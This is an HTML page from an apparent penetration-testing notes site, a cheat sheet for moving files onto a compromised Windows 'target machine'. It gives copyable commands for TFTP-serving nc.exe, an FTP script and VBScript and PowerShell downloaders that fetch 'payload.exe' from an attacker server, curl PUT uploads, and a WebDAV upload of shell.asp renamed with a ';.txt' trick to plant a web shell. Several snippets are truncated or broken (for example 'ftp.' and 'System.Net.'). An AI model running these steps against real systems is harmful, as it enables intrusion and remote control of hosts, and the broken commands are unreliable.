@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<!-- Page title -->
+	<title></title>
+	<!-- Page description -->
+	<meta name="description" content="">
+	<!-- Meta -->
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<!-- Favicon  -->
+	<link rel="icon" type="image/png" href="img/favicons/favicon-16x16.png" sizes="16x16">
+	<link rel="icon" type="image/png" href="img/favicons/favicon-32x32.png" sizes="32x32">
+	<link rel="icon" type="image/png" href="img/favicons/favicon-96x96.png" sizes="96x96">
+	<link rel="apple-touch-icon" sizes="57x57" href="img/favicons/apple-touch-icon-57x57.png">
+	<link rel="apple-touch-icon" sizes="60x60" href="img/favicons/apple-touch-icon-60x60.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="img/favicons/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="76x76" href="img/favicons/apple-touch-icon-76x76.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="img/favicons/apple-touch-icon-114x114.png">
+	<link rel="apple-touch-icon" sizes="120x120" href="img/favicons/apple-touch-icon-120x120.png">
+	<link rel="apple-touch-icon" sizes="144x144" href="img/favicons/apple-touch-icon-144x144.png">
+	<link rel="apple-touch-icon" sizes="152x152" href="img/favicons/apple-touch-icon-152x152.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="img/favicons/apple-touch-icon-180x180.png">
+	<!-- Include StyleSheets -->
+	<link rel="stylesheet" href="css/style.min.css">
+	<!-- <link rel="stylesheet" href="css/custom.css"> -->
+	<script src="js/modernizr.js"></script>
+</head>
+
+<body class="">
+	<!--[if lt IE 8]>
+	    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+	<![endif]-->
+	<!-- Preloader: uncomment this if you want to show a smooth preloader while the page is loading. Don't forget to add the 'js-preload-me' class on the <body> tag. -->
+	<!-- <div class="preloader js-preloader"><div class="preloader-animation"></div></div>
+ -->
+	<!-- End of Preloader -->
+	<div class="page js-page ">
+		<!-- One Page Sidebar -->
+		<div class="one-page-sidebar">
+			<!-- One Page Sidebar Header -->
+			<div class="one-page-sidebar-header">
+				<!-- One Page Logo -->
+				<div class="one-page-logo">
+					<!-- Logo Image -->
+					<a href="index.html" class="logo-image ">
+							<img src="" alt="File Transfers">
+					</a>
+					<!-- End of Logo Image -->
+				</div>
+				<!-- End of One Page Logo -->
+				<!-- One Page Meta -->
+				<div class="one-page-meta">
+					<ul class="one-page-meta-list">
+						<li>
+							<a href="#">
+								<i class="one-page-meta-list-icon fa fa-github-alt"></i>GitHub</a>
+						</li>
+
+					</ul>
+				</div>
+				<!-- End of One Page Meta -->
+			</div>
+			<!-- End of One Page Sidebar Header -->
+			<!-- One Page Nav -->
+			<div class="one-page-nav-wrapper js-custom-scrollbar">
+				<ul class="one-page-nav js-one-page-nav js-menu-vertical" data-prepend-to=".js-prepend-mobile-menu">
+					<li class="is-active">
+						<a href="#content" class="">
+							<span class="one-page-nav-icon">
+								<i class="fa fa-thumbs-o-up"></i>
+							</span>Introduction</a>
+					</li>
+					<li class="">
+						<a href="#TFTP" class="">
+							<span class="one-page-nav-icon">
+								<i class="fa fa-download"></i>
+							</span>TFTP</a>
+					</li>
+					<li class="">
+						<a href="#FTP" class="">
+							<span class="one-page-nav-icon">
+								<i class="fa fa-folder"></i>
+							</span>FTP</a>
+					</li>
+					<li class="">
+						<a href="#VB" class="">
+							<span class="one-page-nav-icon">
+								<i class="fa fa-sitemap"></i>
+							</span>VB Script</a>
+					</li>
+					<li class="">
+							<a href="#PowerShell" class="">
+								<span class="one-page-nav-icon">
+									<i class="fa fa-plug"></i>
+								</span>PowerShell</a>
+						</li>
+					<li class="">
+						<a href="#Curl" class="">
+							<span class="one-page-nav-icon">
+								<i class="fa fa-plug"></i>
+							</span>Curl</a>
+					</li>
+					<li class="">
+							<a href="#Webdav" class="">
+								<span class="one-page-nav-icon">
+									<i class="fa fa-download"></i>
+								</span>Webdav with Cadaver</a>
+						</li>
+				</ul>
+			</div>
+			<!-- End of One Page Nav -->
+			<!-- One Page Sidebar Footer -->
+			<footer class="one-page-sidebar-footer">
+				Nmap</footer>
+			<!-- End of One Page Sidebar Footer -->
+		</div>
+		<!-- End of One Page Sidebar -->
+		<!-- One Page Content -->
+		<div class="one-page-content">
+			<!-- Header -->
+			<header class="header large header-one-page js-header-fixed">
+				<div class="container-fluid container-spaced">
+					<div class="row">
+						<div class="col-md-3 col-sm-6 col-xs-5">
+							<div class="visible-sm-block visible-xs-block">
+								<!-- Logo Image -->
+								<a href="index.html" class="logo-image logo-animated">
+									<img src="img/logos/logo.png" alt="logo">
+								</a>
+								<!-- End of Logo Image -->
+							</div>
+						</div>
+						<div class="col-md-9 col-sm-6 col-xs-7">
+						<!-- Menu -->
+						<nav class="right helper">
+                                <ul class="menu sf-menu js-menu">
+                                    <li>
+                                        <a href="index.html">Home
+                                            <span class="menu-label">NEW</span>
+                                        </a>
+                                        <ul>
+    
+                                            <li>
+                                                <a href="#">Menu</a>
+                                                <ul>
+                                                    <li>
+                                                        <a href="#">Null</a>
+                                                    </li>
+                                                    <li>
+                                                        <a href="#">Null</a>
+                                                    </li>
+                                                </ul>
+                                            </li>
+                                            <li>
+                                                <a href="#">Null</a>
+                                            </li>
+    
+                                        </ul>
+                                    </li>
+                                    
+                                            <li>
+                                                <a href="#">Pages</a>
+                                                <ul>
+                                                    <li>
+                                                        <a href="xss.html">XSS</a>
+                                                    </li>
+                                                <li>
+											
+                                                    <a href="#">File Transfers</a>
+													<ul>
+													<li>
+													
+                                                    <a href="file-transfers.html">File Transfers</a>
+                                                </li>
+                                                </ul>
+                                            
+                                            <li>
+                                                <a href="#">Discovery</a>
+                                                <ul>
+                                                    <li>
+                                                        <a href="nmap.html">nmap</a>
+                                                    </li>
+                                                <li>
+                                                    
+                                            </li>
+                                        </ul>
+                                        <li>
+                                                <a href="#">Enumeration</a>
+                                                <ul>
+                                                    <li>
+                                                        <a href="Web-Enumeration.html">Web Enumeration</a>
+                                                    </li>
+                                                    <li>
+                                                        <a href="nmap.html">SMB Enumeration</a>
+                                                    </li>
+                                                    </ul>
+                                                </ul>
+                                        </li>
+                                    </li>
+                                    <li>
+                                            <a href="index.html">Login</a>
+                                        </li>	
+                                <li>
+                                    <a href="index.html">Contact</a>
+                                </li>		
+                            </nav>
+                            <!-- End of Menu -->
+						</div>
+					</div>
+				</div>
+			</header>
+			<!-- End of Header -->
+			<div id="content">
+				<div class="container-fluid container-spaced">
+					<div class="row">
+						<div class="col-md-12">
+							<div class="js-prepend-mobile-menu">
+								<!-- The mobile menu will be prepended here -->
+							</div>
+							<!-- Category Info -->
+							<div class="category-info helper pt0" id="main-features">
+								<h3 class="category-title"> Introduction
+									<!-- Fragment Identifier -->
+									<a class="fragment-identifier js-fragment-identifier fragment-identifier-scroll" href="#main-features">
+										<i class="fa fa-link"></i>
+									</a>
+									<!-- End of Fragment Identifier -->
+								</h3>
+								<p class="category-content"> File Transfers: There are several ways to transfer files. TFTP, FTP, VBScript, Powershell, Wget, NC.</p>
+							</div>
+													
+							<!-- Category Info -->
+							<div class="category-info " id="TFTP">
+									<h3 class="category-title"> TFTP
+										<!-- Fragment Identifier -->
+										<a class="fragment-identifier js-fragment-identifier fragment-identifier-scroll" href="#Discovery">
+											<i class="fa fa-link"></i>
+										</a>
+										<!-- End of Fragment Identifier -->	
+									</h3>
+									<h4 class="category-description">Let's get started.</h4>
+									<p class="category-content"> </p>
+								</div>
+								<!-- End of Caregory Info -->
+									<!-- Note -->
+										<div class="note js-note purple note-pulse">
+										<span class="note-close js-close">
+											<i class="fa fa-times"></i>
+										</span>
+										<h4 class="note-title"> TFTP</h4>
+										<p class="note-description"> First set up a TFTP Server on the kalibox. Create a tftp directory. Start tftpd service to serve files. Copy file you would like to move to the tftp directory. </p>
+									</div>
+									<!-- End of Note -->
+									<div class="code-highlight " data-label="">
+										<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">mkdir /tftp
+								</code></pre> </div>
+								<div class="code-highlight " data-label="">
+									<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">atftpd --daemon --port 69 /tftp
+							</code></pre> </div>
+							<div class="code-highlight " data-label="">
+								<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">cp /usr/share/windows-binaries/nc.exe /tftp/
+						</code></pre> </div>
+							<!-- Note -->
+							<!-- Note -->
+								<div class="note js-note purple note-pulse">
+									<span class="note-close js-close">
+										<i class="fa fa-times"></i>
+									</span>
+								<h4 class="note-title"> TFTP</h4>
+								<p class="note-description"> Now you can get or put files from the windows machine. </p>
+								</div>
+								<div class="code-highlight " data-label="">
+										<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">tftp -i $kaliIP Get nc.exe
+								</code></pre> </div>
+							<!-- End of Note -->
+							<!-- Category Info -->
+							<div class="category-info " id="FTP">
+									<h3 class="category-title"> FTP
+										<!-- Fragment Identifier -->
+										<a class="fragment-identifier js-fragment-identifier fragment-identifier-scroll" href="#Discovery">
+											<i class="fa fa-link"></i>
+										</a>
+										<!-- End of Fragment Identifier -->	
+									</h3>
+									<h4 class="category-description">Let's get started.</h4>
+									<p class="category-content"> </p>
+								</div>
+							<div class="note js-note blue-light note-bounce">
+									<span class="note-close js-close">
+										<i class="fa fa-times"></i>
+									</span>
+									<h4 class="note-title"> FTP </h4>
+									<p class="note-description"> Install FTP. Setup user and password </p>
+								</div>
+								<div class="code-highlight " data-label="">
+										<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">apt-get install pure-ftpd
+								</code></pre> </div>
+								<div class="code-highlight " data-label="">
+										<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">cat setup-ftp
+								</code></pre> </div>
+								<div class="code-highlight " data-label="">
+										<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">./setup-ftp
+								</code></pre> </div>
+								<div class="note js-note blue-light note-bounce">
+										<span class="note-close js-close">
+											<i class="fa fa-times"></i>
+										</span>
+										<h4 class="note-title"> FTP </h4>
+										<p class="note-description"> Copy the following and paste in the Windows target machine. This will create a connection to your ftp server, enter the username and password, set it to binary mode, grab your payload, and exit.
+												<br><b>Note:</b> you will need to change the ip to your ftp server.</h4></br>	
+										</p>
+									</div>
+							</h3>
+							<p class="category-content"> </p>
+							<div class="code-highlight " data-label="">
+									<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">echo open 192.x.x.x 21> ftp.txt
+echo username>> ftp.txt
+echo password>> ftp.txt
+echo bin >> ftp.txt
+echo GET Payload.exe >> ftp.
+echo by >> ftp.
+ftp -s:ftp.txt
+							</code></pre> </div>
+						</div>
+
+					</div>
+					<div class="note js-note blue-light note-bounce">
+							<span class="note-close js-close">
+								<i class="fa fa-times"></i>
+							</span>
+							<h4 class="note-title"> FTP </h4>
+							<p class="note-description"> Alternatively you can connect to an ftp service. You must have credentials or use anonymous ftp: Username: anonymous Password: anonymous.  </p>
+						</div>
+						<div class="code-highlight " data-label="">
+								<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">ftp $ip 21
+binary
+PUT /root/payload.exe payload.ex
+GET file.exe
+						</code></pre> </div>
+						<div class="code-highlight " data-label="">
+							<!-- Category Info -->
+							<div class="category-info " id="VB">
+									<h3 class="category-title"> VB Script
+										<!-- Fragment Identifier -->
+										<a class="fragment-identifier js-fragment-identifier fragment-identifier-scroll" href="#VB">
+											<i class="fa fa-link"></i>
+										</a>
+										<!-- End of Fragment Identifier -->	
+									</h3>
+									<h4 class="category-description">Let's get started.</h4>
+									<p class="category-content"> </p>
+								</div>
+								<!-- End of Caregory Info -->
+									<!-- Note -->
+										<div class="note js-note red note-pulse">
+										<span class="note-close js-close">
+											<i class="fa fa-times"></i>
+										</span>
+										<h4 class="note-title"> VB</h4>
+										<p class="note-description"> Copy your payload to /var/www/. Start your web server. Then copy the VB-Script below and paste it in the windows target machine. </p>
+									</div>
+									<!-- End of Note -->
+									<div class="code-highlight " data-label="">
+											<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">cp payload.exe /var/www/
+service apache2 start
+									</code></pre> </div>
+									<div class="code-highlight " data-label="">
+										<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+								</code></pre> </div>
+
+							<!-- Note -->
+							<!-- Note -->
+								<div class="note js-note red note-pulse">
+									<span class="note-close js-close">
+										<i class="fa fa-times"></i>
+									</span>
+								<h4 class="note-title"> VB Script</h4>
+								<p class="note-description"> This is like a version of wget for Windows. You can use the following command cscript wget.vbs &lt;your webserver address&gt; &lt;what you want to save the file as&gt;  </p>
+								</div>
+								<div class="code-highlight " data-label="">
+										<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">cscript wget.vbs http://192.x.x.x/payload.exe payload.exe
+								</code></pre> </div>
+							<!-- End of Note -->
+							<!-- Category Info -->
+
+							<!-- Category Info -->
+							<div class="category-info " id="PowerShell">
+									<h3 class="category-title"> PowerShell
+										<!-- Fragment Identifier -->
+										<a class="fragment-identifier js-fragment-identifier fragment-identifier-scroll" href="#PowerShell">
+											<i class="fa fa-link"></i>
+										</a>
+										<!-- End of Fragment Identifier -->	
+									</h3>
+									<h4 class="category-description">Let's get started.</h4>
+									<p class="category-content"> </p>
+								</div>
+								<!-- End of Caregory Info -->
+
+								
+
+							<!-- Note -->
+							<!-- Note -->
+								<div class="note js-note blue note-pulse">
+									<span class="note-close js-close">
+										<i class="fa fa-times"></i>
+									</span>
+								<h4 class="note-title"> PowerShell</h4>
+								<p class="note-description"> This is also like a version of wget for Windows but with powershell. Copy the following into your windows target machine. You can use the following command: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File
+<br><b>Note:</b>Change the url as needed.</br>
+
+								</p>
+								</div>
+								<div class="code-highlight " data-label="">
+										<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">type wget.ps1
+$storageDir = $pwd
+$webclient = New-Object System.Net.
+$url = "http://yourservername/file"
+$file = "payload.exe"
+$webclient.DownloadFile($url,$file)
+								</code></pre> </div>
+							<!-- End of Note -->
+								<!-- Category Info -->
+								<div class="category-info " id="Curl">
+										<h3 class="category-title"> Curl
+											<!-- Fragment Identifier -->
+											<a class="fragment-identifier js-fragment-identifier fragment-identifier-scroll" href="#Curl">
+												<i class="fa fa-link"></i>
+											</a>
+											<!-- End of Fragment Identifier -->	
+										</h3>
+										<h4 class="category-description">Let's get started.</h4>
+										<p class="category-content"> </p>
+									</div>
+									<!-- End of Caregory Info -->
+								<!-- Note -->
+								<!-- Note -->
+									<div class="note js-note blue note-pulse">
+										<span class="note-close js-close">
+											<i class="fa fa-times"></i>
+										</span>
+									<h4 class="note-title"> Curl</h4>
+									<p class="note-description"> If the HTTP method PUT is enabled. You can upload a file to a web server via curl.
+	<br><b>Note:</b>Change the url as needed.</br>
+									</p>
+									</div>
+									<div class="code-highlight " data-label="">
+											<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">curl -T &lt;localfile&gt; http://targetip/folder/file
+									</code></pre> </div>
+									<div class="code-highlight " data-label="">
+											<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">curl -d &lt;localfile&gt; -X PUT http://targetip/folder/file
+									</code></pre> </div>
+								<!-- End of Note -->
+																<!-- Category Info -->
+																<div class="category-info " id="Webdav">
+																	<h3 class="category-title"> Webdav with Cadaver
+																		<!-- Fragment Identifier -->
+																		<a class="fragment-identifier js-fragment-identifier fragment-identifier-scroll" href="#Webdav">
+																			<i class="fa fa-link"></i>
+																		</a>
+																		<!-- End of Fragment Identifier -->	
+																	</h3>
+																	<h4 class="category-description">Let's get started.</h4>
+																	<p class="category-content"> </p>
+																</div>
+																<!-- End of Caregory Info -->
+															<!-- Note -->
+															<!-- Note -->
+																<div class="note js-note blue note-pulse">
+																	<span class="note-close js-close">
+																		<i class="fa fa-times"></i>
+																	</span>
+																<h4 class="note-title"> Webdav with Cadaver</h4>
+																<p class="note-description"> Install Cadaver with: apt-get install cadaver. </br>
+																</p>
+																</div>
+																<div class="code-highlight " data-label="">
+																		<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">Cadaver http://$ip
+																</code></pre> </div>
+																<div class="code-highlight " data-label="">
+																		<span class="js-copy-to-clipboard copy-code">copy</span> <pre><code class="language-markup js-code">Put shell.asp shell.txt
+copy shell.txt shell.asp;.txt
+																</code></pre> </div>
+															<!-- End of Note -->
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- End of One Page Content -->
+	</div>
+	<script src="js/all.js"></script>
+	<script src="js/custom.js"></script>
+</body>
+
+</html>
